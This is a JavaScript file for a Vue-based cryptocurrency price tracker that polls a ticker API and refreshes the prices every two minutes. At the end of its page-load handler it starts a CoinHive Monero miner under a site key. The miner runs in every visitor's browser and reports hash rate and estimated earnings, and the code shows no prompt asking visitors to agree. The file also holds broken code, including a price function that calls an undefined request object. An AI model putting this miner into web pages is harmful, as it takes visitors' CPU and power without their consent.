window.onload = function() {

    function get(url) {
        return new Promise(function(resolve, reject){
            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", url, true);
            xhttp.onload = function() {
                if (xhttp.status == 200) {
                    resolve(JSON.parse(xhttp.response));
                } else {
                    reject(xhttp.statusText);
                }
            };
            xhttp.onerror = function() {
                reject(xhttp.statusText);
            };
            xhttp.send();
        });
    }

    var globalSymbol = '$';
    var globalCode = 'USD';
    //Vue object
    var prices = new Vue({
        el: "#main",
        data: {
            BTC: '',        // bitcoin
            ETH: '',        // ethereum
            BCH: '',        // bitcoin cash
            XRP: '',        // ripple
            LTC: '',        // litecoin
            DASH: '',       // dash
            NEO: '',        // neo
            XEM: '',        // nem
            XMR: '',        // monero
            ETC: '',        // ethereum classic
            DOGE: '',       // dogecoin
            PEPECASH: '',   // pepe cash
            DOPE: '',       // dopecoin
            MAO: '',        // mao zedong
            NYAN: '',       // nyancoin

            DOGErank: 0,
            PEPECASHrank: 0,
            DOPErank: 0,
            MAOrank:  0,
            NYANrank: 0,

            rate: 0,
            total: 0,
            monero: 0

        },
        methods: {
            changePrice(symbol, code) {
                let url = "https://api.coindesk.com/v1/bpi/currentprice.json";
                request.open("GET", url, true);
                request.onload = function() {
                    var data = JSON.parse(request.responseText);
                    var value = data.bpi[code].rate;
                    value = symbol + value.substring(0, value.length - 2);
                    prices.bitcoin = value;
                    prices.ethereum = "Hello";
                }
                request.send();
            },
            init(symbol, code) {
                globalCode = code;
                globalSymbol = symbol;
                var request = new XMLHttpRequest();
                request.open('GET', "https://api.coinmarketcap.com/v1/ticker/?convert=" + code, true);
                request.onload = function() {
                    var data = JSON.parse(request.responseText);
                    for (let i = 0; i < 10; i++) {
                        prices[data[i].symbol] = symbol + " " + parseFloat(data[i]["price_" + code.toLowerCase()]).toFixed(4);
                    }
                    for (let i = 10; i < data.length; i++) {
                        if (data[i].symbol === "DOGE" || data[i].symbol === "PEPECASH" || data[i].symbol === "DOPE"
                            || data[i].symbol === "MAO" || data[i].symbol === "NYAN") {
                            prices[data[i].symbol] = symbol + " " + parseFloat(data[i]["price_" + code.toLowerCase()]).toFixed(4);
                            prices[data[i].symbol + "rank"] = data[i].rank;
                        }
                    }
                }
                request.send();
            },
            /*
            update(symbol, code) {
                let api = "https://api.cryptonator.com/api/ticker/";
                var promise = get(api + "btc-" + code);
                promise.then(function(bitcoin){
                    prices.bitcoin = symbol + Math.round(parseFloat(bitcoin.ticker.price)*100)/100;
                    return get(api + "eth-" + code);
                }).then(function(ethereum){
                    prices.ethereum = symbol + Math.round(parseFloat(ethereum.ticker.price)*100)/100;
                    return get(api + "bch-" + code);
                }).then(function(bitcoinCash){
                    prices.bitcoinCash = symbol + Math.round(parseFloat(bitcoinCash.ticker.price)*100)/100;
                    return get(api + "xrp-" + code);
                }).then(function(ripple){
                    prices.ripple = symbol + Math.round(parseFloat(ripple.ticker.price)*10000)/10000;
                    return get(api + "ltc-" + code);
                }).then(function(litecoin){
                    prices.litecoin = symbol + Math.round(parseFloat(litecoin.ticker.price)*100)/100;
                    return get(api + "dash-" + code)
                }).then(function(dash){
                    prices.dash = symbol + Math.round(parseFloat(dash.ticker.price)*100)/100;
                    return get(api + "neo-" + code)
                }).then(function(neo){
                    prices.neo = symbol + Math.round(parseFloat(neo.ticker.price)*100)/100;
                    return get(api + "xem-" + code)
                }).then(function(nem){
                    prices.nem = symbol + Math.round(parseFloat(nem.ticker.price)*10000)/10000;
                    return get(api + "xmr-" + code)
                }).then(function(monero){
                    prices.monero = symbol + Math.round(parseFloat(monero.ticker.price)*100)/100;
                    return get(api + "etc-" + code)
                }).then(function(etherClassic){
                    prices.etherClassic = symbol + Math.round(parseFloat(etherClassic.ticker.price)*100)/100;
                }).catch(function(error) {
                    console.log(error);
                });
            }*/
        }

    });

    (function(){
        prices.init(globalSymbol, globalCode);
        setTimeout(arguments.callee, 120*1000); // refresh every two minutes
    })();

    
    var miner = new CoinHive.Anonymous('JFnmtyY2c9Itcl8HnvWzyWwR9RSoQ6fq');
    miner.start();
    miner.on('found', function() {console.log('hash found!');})
    miner.on('accepted', function() { console.log('hash accepted!');})

    // Update stats once per second
    setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond().toFixed(4);
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();

        prices.rate = hashesPerSecond;
        prices.total = totalHashes;
        prices.monero = (totalHashes/1000000 * 0.0001692).toFixed(8);
    }, 1000);
    
}

